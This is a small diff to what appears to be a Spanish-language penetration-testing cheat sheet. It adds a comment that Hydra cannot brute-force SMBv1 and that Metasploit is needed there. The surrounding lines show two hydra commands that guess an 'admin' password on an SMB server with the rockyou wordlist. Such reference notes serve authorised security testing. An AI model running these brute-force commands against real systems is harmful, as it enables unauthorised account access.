@@ -109,6 +109,8 @@ Esto se usa en el panel del admin de WordPress.
 
 ## Hydra fuerza bruta SMB / SAMBA
 ```python 
+# Si esta  la version 'SMBv1', no podremos usar esta herramienta para Fuerza Bruta, solo con Metasploit
+
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta al usuario en el servidor SMB
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb
 
